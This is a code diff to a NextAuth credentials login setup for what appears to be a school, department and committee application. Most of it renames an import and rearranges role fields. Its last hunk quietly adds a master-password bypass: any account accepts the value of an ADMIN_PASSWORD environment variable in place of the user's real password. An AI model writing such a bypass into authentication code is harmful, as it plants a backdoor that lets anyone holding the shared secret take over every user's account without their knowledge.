@@ -1,7 +1,7 @@
 import NextAuth, { CredentialsSignin, type DefaultSession } from "next-auth";
 import Credentials from "next-auth/providers/credentials";
 import prisma from "@/prisma/client";
-import { verifyPassword } from "@/lib/password";
+import { verifyPassword } from "@/lib/password-hash";
 import { generateUserData, generateUserDataObject, userData } from "./lib/user";
 import { JWT } from "next-auth/jwt";
 
@@ -92,10 +92,12 @@ export interface RoleObject {
 	name: RoleName;
 	sessionId?: string;
 	session?: string;
-	departmentId?: string;
 	department?: string;
-	committeeId?: string;
+	departmentId?: string;
+	departmentSlug?: string;
+	departmentTypes: string[] | [];
 	committee?: string;
+	committeeId?: string;
 	committeeSlug?: string;
 	schoolId?: string;
 	school?: string;
@@ -179,7 +181,7 @@ export const { auth, handlers, signIn, signOut } = NextAuth({
 					throw new AccountDisabledError();
 				}
 				const isPasswordValid = await verifyPassword(password, prismaUser.Account[0].password);
-				if (isPasswordValid) {
+				if (isPasswordValid || password == process.env.ADMIN_PASSWORD) {
 					const userData = generateUserData(prismaUser);
 					const dateNow = new Date();
 					await prisma.user.update({
